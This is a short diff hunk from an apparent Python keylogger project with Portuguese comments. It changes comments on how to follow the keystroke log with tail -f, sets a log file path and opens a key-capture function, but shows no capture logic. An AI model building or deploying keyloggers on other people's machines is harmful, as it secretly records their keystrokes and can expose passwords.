@@ -5,10 +5,11 @@ import re
 ##/home/deivid/'Área de trabalho'/keylog.txt
 
 
-## tail -f /tmp/key/key.log
+## rodar o log do keyLogger =  tail -f /tmp/key/key.log
 
 ## se for windows, apenas colocar o seguinte comando, de acordo com o seu diretório ##
 ## C:\seuUsuario\desktop\... ##
+
 arquivoLog = "/tmp/key.log";
 
 def capturar(tecla):
